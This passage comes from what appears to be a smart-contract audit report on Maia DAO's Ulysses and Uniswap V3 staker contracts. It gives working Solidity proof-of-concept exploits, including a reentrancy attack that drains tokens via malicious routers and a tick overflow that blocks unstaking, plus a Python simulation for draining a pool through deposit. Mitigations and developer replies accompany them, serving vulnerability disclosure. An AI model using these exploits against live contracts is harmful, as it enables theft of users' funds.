I received permission to add the PoC from the judge.This is modified fromtestFullIncentiveNoBoost(). Please add this to the end ofUniswapV3StakerTest.t.sol.There are comments describing each step to simulate the issues in the code:structSwapCallbackData{boolzeroForOne;}functionuniswapV3SwapCallback(int256amount0,int256amount1,bytescalldata_data)external{require(msg.sender==address(pool),"FP");require(amount0>0||amount1>0,"LEZ");// swaps entirely within 0-liquidity regions are not supportedSwapCallbackDatamemorydata=abi.decode(_data, (SwapCallbackData));boolzeroForOne=data.zeroForOne;if(zeroForOne) {token0.mint(address(this),uint256(amount0));token0.transfer(msg.sender,uint256(amount0));}else{token1.mint(address(this),uint256(amount1));token1.transfer(msg.sender,uint256(amount1));}}// Test minting a position and transferring it to Uniswap V3 Staker, after creating a gaugefunctiontestAudit1()public{// Create a Uniswap V3 pool(pool,poolContract) =UniswapV3Assistant.createPool(uniswapV3Factory,address(token0),address(token1),poolFee);// Initialize 1:1 0.3% fee poolUniswapV3Assistant.initializeBalanced(poolContract);hevm.warp(block.timestamp+100);// 3338502497096994491500 to give 1 ether per token with 0.3% fee and -60,60 ticksuint256_tokenId0=newNFT(-180,180,3338502497096994491500);uint256_tokenId1=newNFT(-60,60,3338502497096994491500);hevm.warp(block.timestamp+100);// @audit Step 1: Swap to make currentTick go to (60, 180) rangeuint256amountSpecified=30ether;boolzeroForOne=false;pool.swap(address(this),zeroForOne,int256(amountSpecified),1461446703485210103287273052203988822378723970342-1,// MAX_SQRT_RATIO - 1abi.encode(SwapCallbackData({zeroForOne:zeroForOne})));(,int24_currentTick, , , , ,) =pool.slot0();console2.logInt(int256(_currentTick));hevm.warp(block.timestamp+100);// @audit Step 2: Swap back to make currentTick go back to (-60, 60) rangezeroForOne=true;pool.swap(address(this),zeroForOne,int256(amountSpecified),4295128739+1,// MIN_SQRT_RATIO + 1abi.encode(SwapCallbackData({zeroForOne:zeroForOne})));(,_currentTick, , , , ,) =pool.slot0();console2.logInt(int256(_currentTick));hevm.warp(block.timestamp+100);// @audit Step 3: Create normal Incentiveuint256minWidth=10;// Create a gaugegauge=createGaugeAndAddToGaugeBoost(pool,minWidth);// Create a Uniswap V3 Staker incentivekey=IUniswapV3Staker.IncentiveKey({pool:pool,startTime:IncentiveTime.computeEnd(block.timestamp)});uint256rewardAmount=1000ether;rewardToken.mint(address(this),rewardAmount);rewardToken.approve(address(uniswapV3Staker),rewardAmount);createIncentive(key,rewardAmount);// @audit Step 4: Now we have secondsPerLiquidity of tick 60 is not equal to 0.//        We just need to create a position with range [-120, 60],//        then secondsPerLiquidityInside of this position will be overflowhevm.warp(key.startTime+1);int24tickLower= -120;int24tickUpper=60;uint256tokenId=newNFT(tickLower,tickUpper,3338502497096994491500);(,uint160secondsPerLiquidityInsideX128,) =pool.snapshotCumulativesInside(tickLower,tickUpper);console2.logUint(uint256(secondsPerLiquidityInsideX128));// @audit Step 5: Stake the position// Transfer and stake the position in Uniswap V3 StakernonfungiblePositionManager.safeTransferFrom(address(this),address(uniswapV3Staker),tokenId);(addressowner,,,uint256stakedTimestamp) =uniswapV3Staker.deposits(tokenId);// @audit Step 6: Increase time to make `secondsPerLiquidity` go from negative to positive value//        Then `unstakeToken` will reverthevm.warp(block.timestamp+5weeks);(,secondsPerLiquidityInsideX128,) =pool.snapshotCumulativesInside(tickLower,tickUpper);console2.logUint(uint256(secondsPerLiquidityInsideX128));uniswapV3Staker.unstakeToken(tokenId);}
0xLightt (Maia) confirmed
0xLightt (Maia) commented:
Addressedhere.

[H-18] Reentrancy attack possible onRootBridgeAgent.retrySettlement()with missing access control forRootBridgeAgentFactory.createBridgeAgent()
Submitted bypeakbolt, also found byxuwinnie
RootBridgeAgent.retrySettlement()is lacking alockmodifier to prevent reentrancy andRootBridgeAgentFactory.createBridgeAgent()is missing access control. Both issues combined allow anyone to re-enterretrySettlement()and trigger the same settlement repeatedly.
Impact
An attacker can steal funds from the protocol by executing the same settlement multiple times before it is marked as executed.
Issue #1
InRootBridgeAgentFactory, the privileged functioncreateBridgeAgent()is lacking access control, which allows anyone to deploy a newRootBridgeAgent. Leveraging that, the attacker can inject maliciousRootRouterandBranchRouterthat can be used to trigger a reentrancy attack inretrySettlement(). Injection of the maliciousBranchRouteris done with a separate call toCoreRootRouter.addBranchToBridgeAgent()inCoreRootRouter.sol#L81-L116, refer to POC for actual steps.
functioncreateBridgeAgent(address_newRootRouterAddress)externalreturns(addressnewBridgeAgent) {newBridgeAgent=address(DeployRootBridgeAgent.deploy(wrappedNativeToken,rootChainId,daoAddress,local`AnyCall`Address,local`AnyCall`ExecutorAddress,rootPortAddress,_newRootRouterAddress));IRootPort(rootPortAddress).addBridgeAgent(msg.sender,newBridgeAgent);}
https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/factories/RootBridgeAgentFactory.sol#L75C1-L89C6
Issue #2
InRootBridgeAgent, theretrySettlement()function is not protected from reentrancy with thelockmodifier. We can then re-enter this function via the injected maliciousBranchRouter(Issue #1). The maliciousBranchRoutercan be triggered viaBranchBridgeAgentExecutorwhen the attacker performs the settlement call. That will executeIRouter(_router).anyExecuteSettlement()when additionalcalldatais passed in, as shown inBranchBridgeAgentExecutor.sol#L110.
functionretrySettlement(uint32_settlementNonce,uint128_remoteExecutionGas)externalpayable{//Update User Gas available.if(initialGas==0) {userFeeInfo.depositedGas=uint128(msg.value);userFeeInfo.gasToBridgeOut=_remoteExecutionGas;}//Clear Settlement with updated gas._retrySettlement(_settlementNonce);}
https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L244-L252
Proof of Concept
First append the following malicious router contracts toRootTest.t.sol:
import{SettlementParams}from"@omni/interfaces/IBranchBridgeAgent.sol";contractAttackerBranchRouterisBaseBranchRouter{uint256counter;functionanyExecuteSettlement(bytescalldatadata,SettlementParamsmemorysParams)externaloverridereturns(boolsuccess,bytesmemoryresult){// limit the recursive loop to re-enter 4 times (just for POC purpose)if(counter++ ==4)return(true,"");addressrootBridgeAgentAddress=address(uint160(bytes20(data[0:20])));// Re-enter retrySettlement() before the first settlement is marked as executedRootBridgeAgentrootBridgeAgent=RootBridgeAgent(payable(rootBridgeAgentAddress));rootBridgeAgent.retrySettlement{value:3e11}(sParams.settlementNonce,1e11);// Top-up gas for BranchBridgeAgent as retrySettlement() will refund gas after each callBranchBridgeAgentbranchAgent=BranchBridgeAgent(payable(localBridgeAgentAddress));WETH9nativeToken=WETH9(branchAgent.wrappedNativeToken());nativeToken.deposit{value:1e11}();nativeToken.transfer(address(branchAgent),1e11);}fallback()externalpayable{}}contractAttackerRouterisTest{functionreentrancyAttack(RootBridgeAgent_rootBridgeAgent,addressowner,addressrecipient,addressoutputToken,uint256amountOut,uint256depositOut,uint24toChain)externalpayable{// Approve Root Port to spend/send output hTokens.ERC20hTokenRoot(outputToken).approve(address(_rootBridgeAgent),amountOut);// Encode calldata to pass in rootBridgeAgent address and// also to trigger exeuction of anyExecuteSettlementbytesmemorydata=abi.encodePacked(address(_rootBridgeAgent));// Initiate the first settlement_rootBridgeAgent.callOutAndBridge{value:msg.value}(owner,recipient,data,outputToken,amountOut,depositOut,toChain);}}
Then add and run following test case in theRootTestcontract withinRootTest.t.sol:
functiontestPeakboltRetrySettlementReentrancy()public{//Set uptestAddLocalTokenArbitrum();addressattacker=address(0x999);// Attacker deploys RootBridgeAgent with malicious Routers// Issue 1 - RootBridgeAgentFactory.createBridgeAgent() has no access control,//           which allows anyone to create RootBridgeAgent and inject RootRouter and BranchRouter.hevm.startPrank(attacker);AttackerRouterattackerRouter=newAttackerRouter();AttackerBranchRouterattackerBranchRouter=newAttackerBranchRouter();RootBridgeAgentattackerBridgeAgent=RootBridgeAgent(payable(RootBridgeAgentFactory(bridgeAgentFactory).createBridgeAgent(address(attackerRouter))));attackerBridgeAgent.approveBranchBridgeAgent(ftmChainId);hevm.stopPrank();//Get some gas.hevm.deal(attacker,0.1ether);hevm.deal(address(attackerBranchRouter),0.1ether);// Add FTM branchBridgeAgent and inject the malicious BranchRouterhevm.prank(attacker);rootCoreRouter.addBranchToBridgeAgent{value:1e12}(address(attackerBridgeAgent),address(ftmBranchBridgeAgentFactory),address(attackerBranchRouter),address(ftmCoreRouter),ftmChainId,5e11);// Initialize malicious BranchRouter with the created BranchBridgeAgent for FTMBranchBridgeAgentattackerBranchBridgeAgent=BranchBridgeAgent(payable(attackerBridgeAgent.getBranchBridgeAgent(ftmChainId)));hevm.prank(attacker);attackerBranchRouter.initialize(address(attackerBranchBridgeAgent));// Get some hTokens for attacker to create the first settlementuint128settlementAmount=10ether;hevm.prank(address(rootPort));ERC20hTokenRoot(newAvaxAssetGlobalAddress).mint(attacker,settlementAmount,rootChainId);console2.log("STATE BEFORE:");// Attacker should have zero AvaxAssetLocalToken before bridging to FTM via the settlementconsole2.log("Attacker newAvaxAssetLocalToken (FTM) Balance:\t",MockERC20(newAvaxAssetLocalToken).balanceOf(attacker));require(MockERC20(newAvaxAssetLocalToken).balanceOf(attacker) ==0);// Attacker will start with 1e18 hTokens for the first settlementconsole2.log("Attacker Global Balance:\t",MockERC20(newAvaxAssetGlobalAddress).balanceOf(attacker));require(MockERC20(newAvaxAssetGlobalAddress).balanceOf(attacker) ==settlementAmount);// Expect next settlementNonce to be '1' before settlement creationconsole2.log("attackerBridgeAgent.settlementNonce: %d",attackerBridgeAgent.settlementNonce());require(attackerBridgeAgent.settlementNonce() ==1);// Execution history in BranchBridgeAgent is not marked yetconsole2.log("attackerBranchBridgeAgent.executionHistory(1) = %s",attackerBranchBridgeAgent.executionHistory(1));console2.log("attackerBranchBridgeAgent.executionHistory(2) = %s",attackerBranchBridgeAgent.executionHistory(2));// Attacker transfers hTokens into router, triggers the first settlement and then the reentrancy attack// Issue 2 - RootBridgeAgent.retrySettlement() has no lock to prevent reentrancy//           We can re-enter retrySettlement() via the injected malicious BranchRouter (above)//           Refer to AttackerRouter and AttackerBranchRouter contracts to see the reentrance callshevm.prank(attacker);MockERC20(newAvaxAssetGlobalAddress).transfer(address(attackerRouter),settlementAmount);hevm.prank(attacker);attackerRouter.reentrancyAttack{value:1e13}(attackerBridgeAgent,attacker,attacker,address(newAvaxAssetGlobalAddress),settlementAmount,0,ftmChainId);console2.log("STATE AFTER:");// Attacker will now have 5e19 AvaxAssetLocalToken after using 1e19 and some gas to perform 4x recursive reentrancy attackconsole2.log("Attacker newAvaxAssetLocalToken (FTM) Balance: ",MockERC20(newAvaxAssetLocalToken).balanceOf(attacker));require(MockERC20(newAvaxAssetLocalToken).balanceOf(attacker) ==5e19);// The hTokens have been used for the first settlementconsole2.log("Attacker Global Balance: ",MockERC20(newAvaxAssetGlobalAddress).balanceOf(attacker));require(MockERC20(newAvaxAssetGlobalAddress).balanceOf(attacker) ==0);// Expect next settlementNonce to be '2' as we only used '1' for the attackerconsole2.log("attackerBridgeAgent.settlementNonce: %d",attackerBridgeAgent.settlementNonce());require(attackerBridgeAgent.settlementNonce() ==2);// This shows that only execution is marked for settlementNonce '1'console2.log("attackerBranchBridgeAgent.executionHistory(1): %s",attackerBranchBridgeAgent.executionHistory(1));console2.log("attackerBranchBridgeAgent.executionHistory(2): %s",attackerBranchBridgeAgent.executionHistory(2));}
Recommended Mitigation Steps
Add alockmodifier toRootBridgeAgent.retrySettlement()and add access control toRootBridgeAgentFactory.createBridgeAgent().
0xBugsy (Maia) confirmed and commented:
Due to a cross-chain tx being composed of several txs on different networks, this would only be feasible on arbitrum, since it’s the only chain where bothrootandbranchcontracts co-exist; allowing you to nest new retrys inside the previous. Otherwise, the nonce would be flagged as executed in the execution history after the first successful run. But definitely thelockshould be added.
0xBugsy (Maia) commented:
To give a little further context on my reply:The permissionless addition ofBridge Agentdoes not expose any unintended functions to theRouter, so this part is completely intended on our behalf.The core issue here, really resides on the fact that theexecutionHistory[nonce] = true;should be done in theBranchandRootBridge Agentsbefore and not after (respecting CEI), calling their respectiveExecutorwithin a try-catch block. Adding alockcan also be introduced as a safe-guard, but adding that by itself we would still be able to do this attack once within the original settlement.
0xLightt (Maia) commented:
Addressedhere.

[H-19] An attacker can exploit the “deposit” to drain theUlysess Liquidity Pool
Submitted byxuwinnie
Users have two methods to add liquidity to theUlysses Pool: “mint” and “deposit”. However, the latter may return an inaccurate output, which could be exploited to drain the pool.
Proof of Concept
In the process to mint theamountof shares, the state change isA:(band, supply * weight) -> B:(band+update, (supply+amount) * weight). The user paysamount-sum(posFee)+sum(negFee)of the underlying to acquire theamountof shares. This approach is precise.
In the process to deposit theamountof underlying, the simulated state change isA:(band, supply * weight) -> B:(band+update, (supply+amount) * weight). Then,(posFee, negFee)is derived from the simulation ofA -> B. The actual state change isA:(band, supply * weight) -> B':(band+update+posFee, (supply+amount+sum(posFee)-sum(negFee)) * weight). We denote the actual fee ofA -> B'as(posFee', negFee'). The user pays theamountof underlying to acquireamount+sum(posFee)-sum(negFee)of shares. This approach would be acceptable ifsum(pos')-sum(neg') >= sum(pos), but this inequality doesn’t always hold. Ifsum(pos')-sum(neg') < sum(pos)insolvency occurs; and ifsum(pos')-sum(neg') < sum(pos)-sum(neg), the user could take profit.
An example is given below:
amount = 10000000supply = 1000000000000000013287555072weight = [1, 59, 47]band = [99452334745147595191585509, 4253569467850027815346666, 216725069177793291903286517]
When Alice deposits10000000underlying, they will get36215776shares. However, the pool actually worsens.
oldRebalancingFee = [0, 10519971631761767037843097, 18152377668510835770992]newRebalancingFee = [0, 10519971631761767000804564, 18152377668510882599904]oldMinusNew = [0, +37038533, -46828912]
Actually, there should be a systemic approach to construct states ofsum(pos')-sum(neg') < sum(pos)-sum(neg)for attacks. However, due to limited time, I have only conducted random tests. By continuously searching for profitable states and modifying the pool state accordingly, attackers can eventually drain the pool.
FAQ
Here are several questions that readers may have:
Q: Why there are three different scenarios? Why could insolvency and user loss happen simultaneously?A: Imagine when you deposit$100 to the bank, the bank increases your balance by$80 and claims it has got$120.
Q: Why cansum(pos')-sum(neg') >= sum(pos)not hold?A: Difficult question! Roughly this could happen when the amount is significantly smaller thansupplyandposFeeis excessively large.
Q: How can the pool be modified to a target state?A: There are several methods including “mint”, “redeem” and “swap” but the “deposit” method should not be used until we reach the target state because the attacker will mostly experience losses from that.
Q: Why can the attacker eventually drain the pool?A: When calling “mint”, “redeem” or “swap”, the attacker pays exactly the delta value of_calculateRebalancingFee. However, when making a “deposit”, the attacker receives more than what they deserve. At last, by adding liquidity,_calculateRebalancingFeecan be reduced, so the pool will be drained.
Q: Why don’t you provide a coded POC of attack?A: We know “deposit” is dangerous and we deprecate it, that’s enough.
Tools Used
Python
# -*- coding: utf-8 -*-"""Created on Mon Jun 19 10:24:56 2023@author: xuwinnie"""from random import *def getBandwidthUpdateAmounts(roundUp, positiveTransfer, amount, _totalWeights, _totalSupply):# Get the bandwidth state list lengthglobal length, weightArray, bandwithArray# Initialize bandwidth update amountsbandwidthUpdateAmounts = [0] * length# Initialize bandwidth differences from target bandwidthdiffs = [0] * length# Total difference from target bandwidth of all bandwidth statestotalDiff = 0# Total difference from target bandwidth of all bandwidth statestransfered = 0# Total amount to be distributed according to each bandwidth weightstransferedChange = 0for i in range(length):# Load bandwidth and weight from storage# Bandwidth is the first 248 bits of the slotbandwidth = bandwithArray[i]# Weight is the last 8 bits of the slotweight = weightArray[i]# Calculate the target bandwidthtargetBandwidth = (_totalSupply * weight) // _totalWeights# Calculate the difference from the target bandwidthif positiveTransfer:# If the transfer is positive, calculate deficit from target bandwidthif targetBandwidth > bandwidth:# Calculate the differencediff = targetBandwidth - bandwidth# Add the difference to the total differencetotalDiff += diff# Store the difference in the diffs arraydiffs[i] = diffelse:# If the transfer is negative, calculate surplus from target bandwidthif bandwidth > targetBandwidth:# Calculate the differencediff = bandwidth - targetBandwidth# Add the difference to the total differencetotalDiff += diff# Store the difference in the diffs arraydiffs[i] = diff# Calculate the amount to be distributed according deficit/surplus# and/or the amount to be distributed according to each bandwidth weightsif amount > totalDiff:# If the amount is greater than the total deficit/surplus# Total deficit/surplus is distributedtransfered = totalDiff# Set rest to be distributed according to each bandwidth weightstransferedChange = amount - totalDiffelse:# If the amount is less than the total deficit/surplus# Amount will be distributed according to deficit/surplustransfered = amountfor i in range(length):# Increase/decrease amount of bandwidth for each bandwidth statebandwidthUpdate = 0# If there is a deficit/surplus, calculate the amount to be distributedif transfered > 0:# Load the difference from the diffs arraydiff = diffs[i]# Calculate the amount to be distributed according to deficit/surplusif roundUp:bandwidthUpdate = (transfered * diff + totalDiff - 1) // totalDiffelse:bandwidthUpdate = (transfered * diff) // totalDiff# If there is a rest, calculate the amount to be distributed according to each bandwidth weightsif transferedChange > 0:# Load weight from storageweight = weightArray[i]# Calculate the amount to be distributed according to each bandwidth weightsif roundUp:bandwidthUpdate += (transferedChange * weight + _totalWeights - 1) // _totalWeightselse:bandwidthUpdate += (transferedChange * weight) // _totalWeights# If there is an update in bandwidthif bandwidthUpdate > 0:# Store the amount to be updated in the bandwidthUpdateAmounts arraybandwidthUpdateAmounts[i] = bandwidthUpdatereturn (bandwidthUpdateAmounts, length)def updateBandwidth(depositFees, positiveTransfer, destinationState, difference, _totalWeights, _totalSupply, _newTotalSupply):global weightArray, bandwithArrayprint("  updating "+str(destinationState)+" with diffrence "+str(difference))bandwidth = bandwithArray[destinationState]print("    old bandwith "+str(bandwidth))weight = weightArray[destinationState]# Get the target bandwidthtargetBandwidth = (_totalSupply * weight) // _totalWeights# Get the rebalancing fee prior to updating the bandwidtholdRebalancingFee = calculateRebalancingFee(bandwidth, targetBandwidth, positiveTransfer)if positiveTransfer:# If the transfer is positive# Add the difference to the bandwidthbandwidth += differenceelse:# If the transfer is negative# Subtract the difference from the bandwidthbandwidth -= differenceif _newTotalSupply > 0:# True on deposit, mint and redeem# Get the new target bandwidth after total supply changetargetBandwidth = (_newTotalSupply * weight) // _totalWeights# Get the rebalancing fee after updating the bandwidthnewRebalancingFee = calculateRebalancingFee(bandwidth, targetBandwidth, positiveTransfer)positiveFee, negativeFee = 0, 0if newRebalancingFee < oldRebalancingFee:# If new fee is lower than old fee# Calculate the positive feepositiveFee = oldRebalancingFee - newRebalancingFeeprint("    positiveFee "+str(positiveFee))if depositFees:# If depositFees is true, add the positive fee to the bandwidthbandwidth += positiveFeeelse:# If new fee is higher than old feeif newRebalancingFee > oldRebalancingFee:# Calculate the negative feenegativeFee = newRebalancingFee - oldRebalancingFeeprint("    negativeFee "+str(negativeFee))#raise Exception("good")else: print("    no fee")# Update storage with the new bandwidthbandwithArray[destinationState] = bandwidthprint("    new bandwith "+str(bandwidth))return (positiveFee, negativeFee)def calculateRebalancingFee(bandwidth, targetBandwidth, roundDown):# If the bandwidth is larger or equal to the target bandwidth, return 0if bandwidth >= targetBandwidth:return 0# Fee tier 1 (fee % divided by 2)lambda1 = int(20e14)# Fee tier 2 (fee % divided by 2)lambda2 = int(4980e14)# Get sigma2 from the first 8 bytes of the fee slotsigma2 = int(500e14)# Get sigma1 from the next 8 bytes of the fee slotsigma1 = int(6000e14)# Calculate the upper bound for the first feeupperBound1 = (targetBandwidth * sigma1) // DIVISIONER# Calculate the upper bound for the second feeupperBound2 = (targetBandwidth * sigma2) // DIVISIONERif bandwidth >= upperBound1:return 0maxWidth = upperBound1 - upperBound2# If the bandwidth is smaller than upperBound2if bandwidth >= upperBound2:# Calculate the fee for the first intervalfee = calcFee(lambda1, maxWidth, upperBound1, bandwidth, 0, roundDown)else:# Calculate the fee for the first intervalfee = calcFee(lambda1, maxWidth, upperBound1, upperBound2, 0, roundDown)# offset = lambda1 * 2lambda1 *= 2# Calculate the fee for the second intervalfee2 = calcFee(lambda2, upperBound2, upperBound2, bandwidth, lambda1, roundDown)# Add the two fees togetherfee += fee2return feedef calcFee(feeTier, maxWidth, upperBound, bandwidth, offset, roundDown):# Calculate the height of the trapeziumheight = upperBound - bandwidth# Calculate the width of the trapezium, rounded upwidth = ((height * feeTier + maxWidth - 1) // maxWidth) + offset# Calculate the fee for this tierif roundDown:fee = (width * height) // DIVISIONERelse:fee = (width * height + DIVISIONER - 1) // DIVISIONERreturn feedef mint(amount):print("minting "+str(amount)+" underlying")global LPBalance, UnderBalance, totalWeights, totalSupply, poolBalance_totalWeights = totalWeights_totalSupply = totalSupply_newTotalSupply = _totalSupply + amountbandwidthUpdateAmounts, length = getBandwidthUpdateAmounts(True, True, amount, _totalWeights, _newTotalSupply)output = 0negativeFee = 0i = 0while i < length:updateAmount = bandwidthUpdateAmounts[i]if updateAmount > 0:output += updateAmount_positiveFee, _negativeFee = updateBandwidth(False, True, i, updateAmount, _totalWeights, _totalSupply, _newTotalSupply)if _positiveFee > 0:negativeFee += _positiveFeeelse:output += _negativeFeei += 1if negativeFee > output:#raise Exception("Underflow()")passoutput -= negativeFeeLPBalance += outputif output > UnderBalance:raise Exception("Underflow()")UnderBalance -= outputtotalSupply += amountpoolBalance += outputprint("receiving "+str(output)+" lp")print()def deposit(amount):print("depositing "+str(amount)+" underlying")global LPBalance, UnderBalance, totalWeights, totalSupply, poolBalance_totalWeights = totalWeights_totalSupply = totalSupply_newTotalSupply = _totalSupply + amountbandwidthUpdateAmounts, length = getBandwidthUpdateAmounts(False, True, amount, _totalWeights, _newTotalSupply)output = 0negativeFee = 0i = 0while i < length:updateAmount = bandwidthUpdateAmounts[i]if updateAmount > 0:output += updateAmount_positiveFee, _negativeFee = updateBandwidth(True, True, i, updateAmount, _totalWeights, _totalSupply, _newTotalSupply)if _positiveFee > 0:output += _positiveFeeelse:negativeFee += _negativeFeei += 1if negativeFee > output:raise Exception("Underflow()")output -= negativeFeeLPBalance += outputif amount > UnderBalance:raise Exception("Underflow()")UnderBalance -= amounttotalSupply += outputpoolBalance += amountprint("receiving "+str(output)+" lp")print()def redeem(amount):print("redeeming "+str(amount)+" lp")global LPBalance, UnderBalance, totalWeights, totalSupply, poolBalancetotalSupply -= amountif amount > LPBalance:raise Exception("Underflow()")LPBalance -= amount_totalWeights = totalWeights_newTotalSupply = totalSupply_totalSupply = _newTotalSupply + amountbandwidthUpdateAmounts, length = getBandwidthUpdateAmounts(False, False, amount, _totalWeights, _totalSupply)output = 0negativeFee = 0i = 0while i < length:updateAmount = bandwidthUpdateAmounts[i]if updateAmount > 0:output += updateAmount_positiveFee, _negativeFee = updateBandwidth(False, False, i, updateAmount, _totalWeights, _totalSupply, _newTotalSupply)#if _positiveFee > 0:#raise Exception("nooooo()")negativeFee += _negativeFeei += 1if negativeFee > output:raise Exception("Underflow()")output -= negativeFeeUnderBalance += outputpoolBalance -= outputprint("receiving "+str(output)+" underlying")print()def getIdealPoolBalance():global length, bandwithArray, weightArray, totalWeights, totalSupplyassets = 0for i in range(length):targetBandwidth = totalSupply * weightArray[i] // totalWeightsassets += calculateRebalancingFee(bandwithArray[i], targetBandwidth, False)#print(calculateRebalancingFee(bandwithArray[i], targetBandwidth, False))assets += bandwithArray[i]#print(bandwithArray[i])return assetsdef getFeeStatus():global length, bandwithArray, weightArray, totalWeights, totalSupplyassets = 0for i in range(length):targetBandwidth = totalSupply * weightArray[i] // totalWeightsassets += calculateRebalancingFee(bandwithArray[i], targetBandwidth, False)print(i)print(calculateRebalancingFee(bandwithArray[i], targetBandwidth, False))return assets'''cnt = 0cnttt = 0recordinso = []recordluck = []for i in range(100000):DIVISIONER = int(1e18)length = 3bandwithArray = [randint(0, int(1e27)) for _ in range(length)]weightArray = [1] + [randint(1, 100) for _ in range(length - 1)]#weightArray = [1, 1000]totalWeights = sum(weightArray)totalSupply = int(1e27)poolBalance = getIdealPoolBalance()UnderBalance = 0beforeFee = getFeeStatus()#amount = randint(0, int(1e25))amount = 10000000000LPBalance = amountredeem(amount)afterFee = getFeeStatus()if poolBalance < getIdealPoolBalance():print(str(poolBalance)+" insolvency! "+str(getIdealPoolBalance()))cnt += 1recordinso.append(getIdealPoolBalance() - poolBalance)raise Exception("Strange()")if UnderBalance + afterFee > amount + beforeFee :print("lucky!")recordluck.append(UnderBalance + afterFee - amount - beforeFee)cnttt += 1print(i)print(cnt)print(cnttt)'''cnt = 0cnttt = 0recordinso = []recordluck = []recordcomp = []for i in range(1):DIVISIONER = int(1e18)length = 3#bandwithArray = [randint(0, int(1e27)) for _ in range(length)]bandwithArray = [99452334745147595191585509, 4253569467850027815346666, 216725069177793291903286517]#weightArray = [1] + [randint(1, 100) for _ in range(length - 1)]weightArray = [1, 59, 47]totalWeights = sum(weightArray)totalSupply = int(1e27)poolBalance = getIdealPoolBalance()LPBalance = 0UnderBalance = int(1e26)beforeFee = getFeeStatus()#amount = randint(0, int(1e10))amount = 10000000deposit(amount)afterFee = getFeeStatus()if poolBalance < getIdealPoolBalance():print(str(poolBalance)+" insolvency! "+str(getIdealPoolBalance()))cnt += 1recordinso.append(getIdealPoolBalance() - poolBalance)recordcomp.append(LPBalance + afterFee - amount - beforeFee)#raise Exception("good")if LPBalance + afterFee > amount + beforeFee:print("lucky!")cnttt += 1recordluck.append(LPBalance + afterFee - amount - beforeFee)#breakprint(i)print(cnt)print(cnttt)
Recommended Mitigation Steps
Deprecate the “deposit” method. It is hard to find a correct way to handle this.
Assessed type
Context
0xLightt (Maia) confirmed and commented:
I was able to recreate this issue in solidity. But finding the actual issue is essential to make sure this is actually being addressed and there isn’t any more issue due to this. Blindly removing thedepositfunction and hoping this fully fixes this is not a sensible approach.Added these mock functions toUlyssesPoolto help recreate this issue:functionsetTotalSupply(uint256_totalSupply)external{totalSupply=_totalSupply;}functionaddBandwidthTest(uint248bandwidth,uint8weight)external{totalWeights+=weight;bandwidthStateList.push(BandwidthState({bandwidth:bandwidth,destination:UlyssesPool(address(0)),weight:weight}));}functiongetRebalancingFee(uint256index)externalviewreturns(uint256) {return_calculateRebalancingFee(bandwidthStateList[index].bandwidth,totalSupply.mulDiv(bandwidthStateList[index].weight,totalWeights),false);}Then added this test toInvariantUlyssesPoolBoundedto recreate your example:functiontest_435()public{setUpHandler();vm.startPrank(handler);UlyssesPool[]memorypools=createPools(1);UlyssesPoolpool1=UlyssesPool(pools[0]);MockERC20(pool1.asset()).mint(address(handler),type(uint256).max/2);MockERC20(pool1.asset()).mint(address(pool1),100000000000ether);MockERC20(pool1.asset()).approve(address(pool1),type(uint256).max);pool1.setTotalSupply(1000000000000000013287555072);pool1.addBandwidthTest(99452334745147595191585509,1);pool1.addBandwidthTest(4253569467850027815346666,59);pool1.addBandwidthTest(216725069177793291903286517,47);console2.log(pool1.getRebalancingFee(1),pool1.getRebalancingFee(2),pool1.getRebalancingFee(3));uint256feeBefore=pool1.getRebalancingFee(1) +pool1.getRebalancingFee(2) +pool1.getRebalancingFee(3);pool1.deposit(10000000,address(handler));console2.log(pool1.getRebalancingFee(1),pool1.getRebalancingFee(2),pool1.getRebalancingFee(3));uint256feeAfter=pool1.getRebalancingFee(1) +pool1.getRebalancingFee(2) +pool1.getRebalancingFee(3);// Should revert but doesn'tconsole2.log(feeAfter-feeBefore);}
xuwinnie (warden) commented:
Hey, was able to recreate this issue in solidity. But finding the actual issue is essential to make sure this is actually being addressed and there isn’t any more issue due to this. Blindly removing thedepositfunction and hoping this fully fixes this is not a sensible approach.Whenredeemingandminting, the calculation is share->amount. But when depositing, the calculation is amount->share, so I believe removingdepositis the best way. In the equation,amount = share + rebalancingfee(before) - rebalancingfee(after), if we know share, it’s straight forward to get the amount, but it’s hard to get shares from the amount. The current approach indepositis just an approximation and that’s why it can be exploited.
0xLightt (Maia) commented:
Thanks for giving more context, I understand why you are suggesting to remove thedepositfunction as a fix, especially due to the time constraints you mentioned. I just want to make sure this is not being caused by any underlying issue that can still affect other functions.After looking into it more, it is exactly what you suggested; the issue comes from siphoning the_newTotalSupplywhen doing calculations because we are not accounting for shares minted due to rebalancing fees. A possible solution could be to overestimate the new total supply, but it would lead to users overpaying in certain situations. Because of this, thedepositfunction wouldn’t make sense to be used overmint, so it is safer to just remove it.
0xLightt (Maia) commented:
We recognize the audit’s findings on Ulysses AMM. These will not be rectified due to the upcoming migration of this section to Balancer Stable Pools.

[H-20] A user can bypass bandwidth limit by repeatedly “balancing” the pool
Submitted byxuwinnie, also found byxuwinnie
The goal with bandwidths is to have a maximum that can be withdrawn (swapped) from a pool. In case a specific chain (or token from a chain) is exploited, then it only can partially affect these pools. However, the maximum limit can be bypassed by repeatedly “balancing” the pool to increase bandwidth for the exploited chain.
Introducing “Balancing”: A Technique for Redistributing Bandwidth
DuringulyssesAddLPorulyssesAddLP, liquidity is first distributed or taken proportionally todiff(if any exists) and then distributed or taken proportionally toweight. Suppose integertis far smaller thandiff(since the action itself can also changediff), after repeatedly addingt LP, removingt LP, addingt LP, removingt LP, etc., the pool will finally reach another stable state where the ratio ofdifftoweightis a constant among destinations. This implies that thecurrentBandwidthwill be proportional toweight.
Proof of Concept
Suppose Avalanche is down. Unluckily, Alice holds 100 ava-hETH. They want to swap ava-hETH for bnb-hETH.
Let’s take a look at bnb-hETH pool. Suppose weights are mainnet:4, Avalanche:3 and Linea:2. Total supply is 90. Target bandwidths are mainnet:40, Avalanche:30 and Linea:20. Current bandwidths are mainnet:30, Avalanche:2 (few left) and Linea:22.
Ideally Alice should only be able to swap for 2 bnb-hETH. However, they swap for 0.1 bnb-hETH first. Then they use the 0.1 bnb-hETH to “balance” the pool (as mentioned above). Current bandwidths will become mainnet:24, Avalanche:18 and Linea:12. Then, Alice swaps for 14 bnb-hETH and “balance” the pool again. By repeating the process, they can acquire nearly all of the available liquidity in pool andLPloss will be unbounded.
Recommended Mitigation Steps
DuringulyssesAddLPorulyssesAddLP, always distribute or take liquidity proportionally to weight.When swapping A for B, reduce the bandwidth of A in the B pool (as is currently done) while adding bandwidth of B in the A pool (instead of distributing them among all bandwidths).
Assessed type
Context
